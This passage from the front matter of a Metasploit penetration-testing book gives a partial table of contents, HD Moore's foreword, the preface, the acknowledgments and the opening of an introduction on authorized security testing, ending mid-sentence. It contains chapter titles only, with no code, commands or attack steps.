href="#bookmark311">137</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark312" class="a">Web Attack Vectors </a><a href="#bookmark312">142</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark313" class="a">Java Applet </a><a href="#bookmark313">142</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark314" class="a">Client-Side Web Exploits </a><a href="#bookmark314">146</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark315" class="a">Username and Password Harvesting </a><a href="#bookmark315">148</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark316" class="a">Tabnabbing </a><a href="#bookmark316">150</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark317" class="a">Man-Left-in-the-Middle </a><a href="#bookmark317">150</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark318" class="a">Web Jacking </a><a href="#bookmark318">151</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark319" class="a">Putting It All Together with a Multipronged Attack </a><a href="#bookmark319">153</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark320" class="a">Infectious Media Generator </a><a href="#bookmark320">157</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark321" class="a">Teensy USB HID Attack Vector </a><a href="#bookmark321">157</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark322" class="a">Additional SET Features </a><a href="#bookmark322">160</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark323" class="a">Looking Ahead </a><a href="#bookmark323">161</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark335" class="s16">11 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark335" class="s16">FAST-TRACK 163</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark336" class="a">Microsoft SQL Injection </a><a href="#bookmark336">164</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark337" class="a">SQL Injector—Query String Attack </a><a href="#bookmark337">165</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark338" class="a">SQL Injector—POST Parameter Attack </a><a href="#bookmark338">166</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark339" class="a">Manual Injection </a><a href="#bookmark339">167</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark340" class="a">MSSQL Bruter </a><a href="#bookmark340">168</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark341" class="a">SQLPwnage </a><a href="#bookmark341">172</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark342" class="a">Binary-to-Hex Generator </a><a href="#bookmark342">174</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark343" class="a">Mass Client-Side Attack </a><a href="#bookmark343">175</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark344" class="a">A Few Words About Automation </a><a href="#bookmark344">176</a></p><p style="padding-top: 5pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark352" class="s16">12 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark352" class="s16">KARMETASPLOIT 177</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark353" class="a">Configuration </a><a href="#bookmark353">178</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark354" class="a">Launching the Attack </a><a href="#bookmark354">179</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark355" class="a">Credential Harvesting </a><a href="#bookmark355">181</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark356" class="a">Getting a Shell </a><a href="#bookmark356">182</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark357" class="a">Wrapping Up </a><a href="#bookmark357">184</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark370" class="s16">13 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark370" class="s16">BUILDING YOUR OWN MODULE 185</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark371" class="a">Getting Command Execution on Microsoft SQL </a><a href="#bookmark371">186</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark372" class="a">Exploring an Existing Metasploit Module </a><a href="#bookmark372">187</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark373" class="a">Creating a New Module </a><a href="#bookmark373">189</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark374" class="a">PowerShell </a><a href="#bookmark374">189</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark375" class="a">Running the Shell Exploit </a><a href="#bookmark375">190</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark376" class="a">Creating powershell_upload_exec </a><a href="#bookmark376">192</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark377" class="a">Conversion from Hex to Binary </a><a href="#bookmark377">192</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark378" class="a">Counters </a><a href="#bookmark378">194</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark379" class="a">Running the Exploit </a><a href="#bookmark379">195</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark380" class="a">The Power of Code Reuse </a><a href="#bookmark380">196</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark389" class="s16">14 </a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark389" class="s16">CREATING YOUR OWN EXPLOITS 197</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark390" class="a">The Art of Fuzzing </a><a href="#bookmark390">198</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark391" class="a">Controlling the Structured Exception Handler </a><a href="#bookmark391">201</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark392" class="a">Hopping Around SEH Restrictions </a><a href="#bookmark392">204</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark393" class="a">Getting a Return Address </a><a href="#bookmark393">206</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark394" class="a">Bad Characters and Remote Code Execution </a><a href="#bookmark394">210</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark395" class="a">Wrapping Up </a><a href="#bookmark395">213</a></p><p style="padding-top: 15pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark413" class="s16">15 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark413" class="s16">PORTING EXPLOITS TO THE METASPLOIT FRAMEWORK 215</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark414" class="a">Assembly Language Basics </a><a href="#bookmark414">216</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark415" class="a">EIP and ESP Registers </a><a href="#bookmark415">216</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark416">The JMP Instruction Set 216</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark417" class="a">NOPs and NOP Slides </a><a href="#bookmark417">216</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark418" class="a">Porting a Buffer Overflow </a><a href="#bookmark418">216</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark419" class="a">Stripping the Existing Exploit </a><a href="#bookmark419">218</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark420" class="a">Configuring the Exploit Definition </a><a href="#bookmark420">219</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark421" class="a">Testing Our Base Exploit </a><a href="#bookmark421">220</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark422" class="a">Implementing Features of the Framework </a><a href="#bookmark422">221</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark423" class="a">Adding Randomization </a><a href="#bookmark423">222</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark424" class="a">Removing the NOP Slide </a><a href="#bookmark424">223</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark425" class="a">Removing the Dummy Shellcode </a><a href="#bookmark425">223</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark426" class="a">Our Completed Module </a><a href="#bookmark426">224</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark427" class="a">SEH Overwrite Exploit </a><a href="#bookmark427">226</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark428" class="a">Wrapping Up </a><a href="#bookmark428">233</a></p><p style="padding-top: 5pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark439" class="s16">16 </a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark439" class="s16">METERPRETER SCRIPTING 235</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark440" class="a">Meterpreter Scripting Basics </a><a href="#bookmark440">235</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark441" class="a">Meterpreter API </a><a href="#bookmark441">241</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark442" class="a">Printing Output </a><a href="#bookmark442">241</a></p><p class="s12" style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Base API Calls 242</p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark443" class="a">Meterpreter Mixins </a><a href="#bookmark443">242</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark444" class="a">Rules for Writing Meterpreter Scripts </a><a href="#bookmark444">244</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark445" class="a">Creating Your Own Meterpreter Script </a><a href="#bookmark445">244</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark446" class="a">Wrapping Up </a><a href="#bookmark446">250</a></p><p style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark462" class="s16">17 </a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark462" class="s16">SIMULATED PENETRATION TEST 251</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark463" class="a">Pre-engagement Interactions </a><a href="#bookmark463">252</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark464" class="a">Intelligence Gathering </a><a href="#bookmark464">252</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark465" class="a">Threat Modeling </a><a href="#bookmark465">253</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark466" class="a">Exploitation </a><a href="#bookmark466">255</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark467" class="a">Customizing MSFconsole </a><a href="#bookmark467">255</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark468">Post Exploitation 257</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark469" class="a">Scanning the Metasploitable System </a><a href="#bookmark469">258</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark470" class="a">Identifying Vulnerable Services </a><a href="#bookmark470">259</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark471" class="a">Attacking Apache Tomcat </a><a href="#bookmark471">260</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark472" class="a">Attacking Obscure Services </a><a href="#bookmark472">262</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark473" class="a">Covering Your Tracks </a><a href="#bookmark473">264</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark474">Wrapping Up 266</a></p><p style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark484" class="s16">A</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><a href="#bookmark484" class="s16">CONFIGURING YOUR TARGET MACHINES 267</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark485" class="a">Installing and Setting Up the System </a><a href="#bookmark485">267</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark486" class="a">Booting Up the Linux Virtual Machines </a><a href="#bookmark486">268</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark487" class="a">Setting Up a Vulnerable Windows XP Installation </a><a href="#bookmark487">269</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark488" class="a">Configuring Your Web Server on Windows XP </a><a href="#bookmark488">269</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark489" class="a">Building a SQL Server </a><a href="#bookmark489">269</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark490" class="a">Creating a Vulnerable Web Application </a><a href="#bookmark490">272</a></p><p style="padding-left: 54pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark491" class="a">Updating Back|Track </a><a href="#bookmark491">273</a></p><p style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark502" class="s16">B</a></p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="#bookmark502" class="s16">CHEAT SHEET 275</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark503">MSFconsole Commands 275</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark504" class="a">Meterpreter Commands </a><a href="#bookmark504">277</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark505" class="a">MSFpayload Commands </a><a href="#bookmark505">280</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark506" class="a">MSFencode Commands </a><a href="#bookmark506">280</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark507" class="a">MSFcli Commands </a><a href="#bookmark507">281</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark508" class="a">MSF, Ninja, Fu </a><a href="#bookmark508">281</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="#bookmark509" class="a">MSFvenom </a><a href="#bookmark509">281</a></p><p style="padding-left: 18pt;text-indent: 0pt;line-height: 13pt;text-align: left;"><a href="#bookmark510" class="a">Meterpreter Post Exploitation Commands </a><a href="#bookmark510">282</a></p><p class="s15" style="padding-top: 13pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">INDEX 285</p><p class="s13" style="padding-top: 21pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">xii <span class="s14">Contents in Detail </span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-left: 196pt;text-indent: 0pt;text-align: left;"><a name="bookmark1">FOREWORD </a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Information technology is a complex field, littered with the half-dead technology of the past and an ever-increasing menagerie of new systems, software, and protocols. Securing today’s enterprise networks involves more than simply patch management, fire- walls, and user education; it requires frequent real- world validation of what works and what fails. This is what penetration testing is all about.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Penetration testing is a uniquely challenging job. You are paid to think like a criminal, to use guerilla tactics to your advantage, and to find the weak- est links in a highly intricate net of defenses. The things you find can be both surprising and disturbing; penetration tests have uncovered everything from rogue pornography sites to large-scale fraud and criminal activity.</p><p style="padding-left: 83pt;text-indent: 0pt;text-align: center;">Penetration testing is about ignoring an organization’s perception of</p><p style="padding-left: 86pt;text-indent: 0pt;text-align: center;">its security and probing its systems for weaknesses. The data obtained from a successful penetration test often uncovers issues that no architecture review</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">or vulnerability assessment would be able to identify. Typical findings include shared passwords, cross-connected networks, and troves of sensitive data sit- ting in the clear. The problems created by sloppy system administration and rushed implementations often pose significant threats to an organization, while the solutions languish under a dozen items on an administrator’s to-do list. Penetration testing highlights these misplaced priorities and identifies what an organization needs to do to defend itself from a real intrusion.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Penetration testers handle a company’s most sensitive resources; they gain access to areas that can have dire real-world consequences if the wrong action is taken. A single misplaced packet can bring a factory floor to a halt, with a cost measured in millions of dollars per hour. Failure to notify the appropriate personnel can result in an uncomfortable and embarrassing con- versation with the local police. Medical systems are one area that even the most experienced security professionals may hesitate to test; nobody wants to be responsible for mixing up a patient’s blood type in an OpenVMS main- frame or corrupting the memory on an X-ray machine running Windows XP. The most critical systems are often the most exposed, and few system admin- istrators want to risk an outage by bringing down a database server to apply a security patch.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Balancing the use of available attack paths and the risk of causing dam- age is a skill that all penetration testers must hone. This process depends not only on a technical knowledge of the tools and the techniques but also on a strong understanding of how the organization operates and where the path of least resistance may lie.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this book, you will see penetration testing through the eyes of four security professionals with widely divergent backgrounds. The authors include folks with experience at the top of the corporate security structure all the way down to the Wild West world of underground exploit development and vulner- ability research. There are a number of books available on penetration test- ing and security assessments, and there are many that focus entirely on tools. This book, however, strives for a balance between the two, covering the fun- damental tools and techniques while also explaining how they play into the overall structure of a successful penetration testing process. Experienced penetration testers will benefit from the discussion of the methodology, which is based on the recently codified Penetration Test Execution Standard. Readers who are new to the field will be presented with a wealth of informa- tion not only about how to get started but also why those steps matter and what they mean in the bigger picture.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This book focuses on the Metasploit Framework. This open source platform provides a consistent, reliable library of constantly updated exploits and offers a complete development environment for building new tools and automating every aspect of a penetration test. Metasploit Express and Meta- sploit Pro, the commercial siblings of the Framework, are also represented in this book. These products provide a different perspective on how to conduct and automate large-scale penetration tests.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The Metasploit Framework is an infamously volatile project; the code base is updated dozens of times every day by a core group of developers and submissions from hundreds of community contributors. Writing a book about the Framework is a masochistic endeavor; by the time that a given chapter has been proofread, the content may already be out of date. The authors took on the Herculean task of writing this book in such a way that the con- tent will still be applicable by the time it reaches its readers.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">The Metasploit team has been involved with this book to make sure that changes to the code are accurately reflected and that the final result is as close to zero-day coverage of the Metasploit Framework as is humanly possible. We can state with full confidence that it is the best guide to the Metasploit Frame- work available today, and it will likely remain so for a long time. We hope you find this book valuable in your work and an excellent reference in your trials ahead.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s18" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">HD Moore</p><p class="s18" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Founder, The Metasploit Project</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s14" style="padding-top: 5pt;padding-left: 374pt;text-indent: 0pt;text-align: left;">Foreword <span class="s13">xv</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 14pt;padding-left: 208pt;text-indent: 0pt;text-align: left;"><a name="bookmark2">PREFACE </a><a name="bookmark3">&zwnj;</a><a name="bookmark4">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The Metasploit Framework has long been one of the tools most widely used by information security pro- fessionals, but for a long time little documentation existed aside from the source code itself or comments on blogs. That situation changed significantly when Offensive-Security developed its online course, Meta- sploit Unleashed. Shortly after the course went live, No Starch Press contacted us about the possibly of creat- ing a book to expand on our work with Metasploit Unleashed.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This book is designed to teach you the ins and outs of Metasploit and how to use the Framework to its fullest. Our coverage is selective—we won’t cover every single flag or exploit—but we give you the foundation you’ll need to understand and use Metasploit now and in future versions.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When we began writing this book, we had in mind a comment by HD Moore, developer of the Metasploit Framework. In a conversation with HD about the development of our Metasploit Unleashed course, one of us said to him, “I hope the course comes out good.” To this offhand comment, HD merely replied, “Then make sure it is good.” And that’s just what we’ve attempted to do with this book.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As a group, we are experienced penetration testers who use Metasploit daily to circumvent security controls, bypass protections, and attack systems methodically. We wrote this book with the intention of helping our readers become competent penetration testers. HD’s drive and focus on quality is apparent within the Metasploit Framework, and we have tried to match those characteristics in this book. We leave it up to you to judge how well we have lived up to that standard.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 147pt;text-indent: 0pt;text-align: left;"><a name="bookmark5">ACKNOWLEDGMENTS </a><a name="bookmark7">&zwnj;</a><a name="bookmark8">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">We would like to thank a number of people, begin- ning with the folks whose hard work provides the community with an invaluable tool. Special thanks to the Metasploit Team: HD Moore, James Lee, David</p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">D. Rude II, Tod Beardsley, Jonathan Cran, Stephen Fewer, Joshua Drake, Mario Ceballos, Ramon Valle,</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Patrick Webster, Efrain Torres, Alexandre Maloteaux, Wei Chen, Steve Tornio, Nathan Keltner, Chris Gates, Carlos Perez, Matt Weeks, and Raphael Mudge. Also an extra thanks to Carlos Perez for his assistance in writing portions of the Meterpreter scripting chapter.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Many thanks to Scott White, technical reviewer for this book, for being awesome.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Thanks to Offensive-Security for bringing us all together. The Offensive- Security trademark phrase “Try Harder” alternately inspires and tortures us (ryujin is evil).</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We have many other members of the information security community to thank, but there are too many to list and the odds of missing someone are high. So thank you to our friends in the security community; hugs from all of us.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">A very special thanks to the whole crew at No Starch Press for their immeasurable effort. Bill, Alison, Travis, and Tyler, it has been a pleasure working with you and everyone else behind the scenes at No Starch Press!</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Finally, a big thank you to our families. We are all married and half of us have children. We spend far too long wearing down the plastic on our keyboards and not enough time with them. To our families, thanks for your understanding; we will make it up to you—as soon as we update this next line of code, or find the source of this memory corruption, or finish this svn update, or get this next fuzzer run setup, or . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark6">Special Thanks</a><a name="bookmark9">&zwnj;</a></p><p class="s18" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Dave (Twitter: @dave_rel1k): <span class="p">I dedicate my work on this book to my loving wife Erin, who tolerated late nights of me hammering away at the keyboard. To my three children who keep me young and old at the same time. To my father, Jim; my mother, Janna; and my stepmother, Deb, for being there for me and making me what I am today. Thanks to Jim, Dookie, and Muts for their hard work on the book and for being great friends! To my good friends at Offensive-Security; Chris “Logan” Hadnagy; my brother, Shawn Sullivan; and my team at Diebold. To my good friend HD Moore, whose dedication to the security industry is an inspiration to us all. To all my friends in life, and to Scott Angelo for giving me an opportunity and believing in me. Lastly, to God, without whom none of this would be possible.</span></p><p class="s18" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Devon (@dookie2000ca): <span class="p">For my beautiful and tolerant wife, who not only supports but encourages my mania. You are my inspiration and motiva- tion; without you by my side in these pursuits, I would never get anywhere. To my co-authors, thank you for having faith in a newcomer and welcoming me as one of your own. Lastly, an especially big thank you to Mati for not only getting this merry band together but for giving me a chance.</span></p><p class="s18" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Muts (@backtracklinux): <span class="p">A special thanks to the co-authors of this book, whose time and dedication to it is truly inspiring. I count Jim, Devon, and Dave as great friends and colleagues in the security field.</span></p><p class="s18" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Jim (@_Elwood_): <span class="p">Thanks to Matteo, Chris “Logan,” and the entire Offensive-Security crew. Also a big thanks to Robert, Matt, Chris, and my co-workers at StrikeForce. And to my wonderful wife Melissa: The book you</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">hold in your hands is proof that I was not just avoiding housework all the time. And to Jake and Joe, please don’t tell Mom that I am just playing games with you when I tell her I am working. You three are the Pack-a-Punch to my life. And finally to my co-authors Mati, Devon, and Dave: Thanks for letting me put my name on this book—I really was just avoiding housework.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 173pt;text-indent: 0pt;text-align: left;"><a name="bookmark10">INTRODUCTION </a><a name="bookmark17">&zwnj;</a><a name="bookmark18">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Imagine that sometime in the not-so-distant future an attacker decides to attack a multinational company’s digital assets, targeting hundreds of millions of dollars worth of intellectual property buried behind millions of dollars in infrastructure. Naturally, the attacker begins by firing up the latest version of Metasploit.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">After exploring the target’s perimeter, he finds a soft spot and begins a methodical series of attacks, but even after he’s compromised nearly every aspect of the network, the fun has only just begun. He maneuvers through systems, identifying core, critical business components that keep the com- pany running. With a single keystroke, he could help himself to millions of company dollars and compromise all their sensitive data.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Congratulations on a job well done—you’ve shown true business impact, and now it’s time to write the report. Oddly enough, today’s penetration testers often find themselves in the role of a fictitious adversary like the one described above, performing legal attacks at the request of companies that <span class="s19">need </span>high levels of security. Welcome to the world of penetration testing and the future of security.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark11">Why Do a Penetration Test?</a><a name="bookmark19">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Companies invest millions of dollars in security programs to protect critical infrastructures, identify chinks in the armor, and prevent serious data breaches. A penetration test is one of the most effective ways to identify systemic weak- nesses and deficiencies in these programs. By attempting to circumvent secu- rity controls and bypass security mechanisms, a penetration tester is able to identify ways in which a hacker might be able to compromise an organization’s security and damage the organization as a whole.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As you read through this book, remember that you’re not necessarily targeting one system or multiple systems. Your goal is to 